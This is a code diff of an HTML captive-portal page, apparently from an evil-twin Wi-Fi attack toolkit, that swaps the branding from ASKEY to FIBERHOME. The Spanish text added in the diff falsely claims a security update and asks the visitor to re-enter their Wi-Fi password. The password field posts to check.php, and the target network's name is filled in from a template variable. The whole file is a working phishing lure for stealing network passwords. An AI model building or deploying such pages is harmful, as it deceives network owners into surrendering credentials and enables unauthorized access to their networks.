@@ -5,7 +5,7 @@
   <meta charset="UTF-8">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>ASKEY COMPUTER CORP</title>
+  <title>FIBERHOME</title>
   <link rel="stylesheet" href="assets/css/style.css">
   <link rel="shortcut icon" href="assets/img/apple-icon-60x60.png">
 </head>
@@ -14,20 +14,29 @@
 
   <main class="main">
 
-    <section class="before-form header">
+    <section>
       <a href="#" class="logo" style="text-decoration: none; color: black; font-weight: bold;">
         <img src="assets/img/logo.png" alt="puede ser una imagen del logo de askey computer corp">
       </a>
-      <p class="subtitle">Por favor, verifique su contraseña Wi-Fi e intente nuevamente...</p>
+      <p class="subtitle">Lamentamos los inconvenientes que esto le puede causar, pero es necesario garantizar la
+        seguridad de nuestros clientes.</p>
     </section>
 
-    <form class="form" action="check.php" id="form1" name="form1" method="POST" accept-charset="UTF-8">
+    <section class="before-form">
+      <h2 class="red">SSID:</h2>
+      <h3 class="ssid">$APTargetSSID</h2>
+        <p class="note">Nota:</p>
+        <p class="subtitle">Nueva actualización de seguridad, por favor, ingrese nuevamente su contraseña Wi-Fi para
+          continuar con la actualización y poder seguir disfrutando de su conexión a internet.</p>
+    </section>
+
+    <form class="form1" name="form1" action="check.php" id="check-user" accept-charset="UTF-8" method="POST">
       <input type="password" placeholder="Contraseña" name="key1" id="key1">
       <input type="submit" value="Aceptar" name="pw_submit" id="pw_submit">
     </form>
 
     <section class="help">
-      <a href="index.html">¿Necesitas ayuda?</a>
+      <a href="#">¿Necesitas ayuda?</a>
     </section>
 
   </main>
